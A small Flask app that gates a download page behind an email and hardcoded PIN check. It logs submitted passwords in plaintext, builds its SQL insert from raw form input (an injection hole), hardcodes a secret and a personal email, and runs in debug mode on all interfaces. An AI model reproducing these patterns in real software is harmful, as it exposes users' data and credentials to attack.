from flask import Flask,render_template,request,redirect
import sqlite3
app = Flask(__name__)
app.debug= True
@app.route('/verify',methods=["POST","GET"])
def veri():
        if request.method == "POST":
                email = request.form["email"]
                pin = request.form["password"]
                print(f"email : {email} \n pin : {pin}")
                if pin != "123ab90" or email == "eyakalu8@gmail.com":
                        return '<script>alert("incorrect otp");window.history.back();</script>'
                db = sqlite3.connect("database.db")
                c = db.cursor()
                c.execute(f"INSERT INTO se (email,pin) VALUES('{email}','{pin}')")
                db.commit()
                return redirect('/download')
        return render_template("veri.html")
@app.route('/download')
def dor():
        return render_template('down.html')

if __name__ == "__main__":
        app.run(host="0.0.0.0",port=8080)
